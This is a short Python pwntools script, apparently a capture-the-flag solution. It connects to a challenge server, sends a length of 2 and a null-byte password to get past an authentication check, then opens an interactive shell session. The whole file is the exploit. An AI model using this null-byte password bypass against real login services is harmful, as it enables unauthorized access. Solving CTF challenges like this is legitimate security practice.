from pwn import *

HOST = "tcp.flagyard.com"
PORT = 31124

def conn():
    return remote(HOST, PORT)

def main():
    r = conn()

    r.sendlineafter(b"length: ", b"2")
    r.sendlineafter(b"password: ", b"\x00")

    r.interactive()

if __name__ == "__main__":
    main()
